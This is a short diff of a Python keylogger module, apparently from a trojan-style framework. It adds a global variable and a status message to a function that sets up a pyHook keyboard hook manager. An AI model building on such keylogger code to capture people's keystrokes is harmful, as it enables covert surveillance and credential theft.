@@ -72,6 +72,10 @@ def KeyStroke(event):
     return True
 
 def run(**args):
+    global data
+
+    print "[*] In keylogger module."
+    
     try:
         # create and register a hook manager
         kl         = pyHook.HookManager()
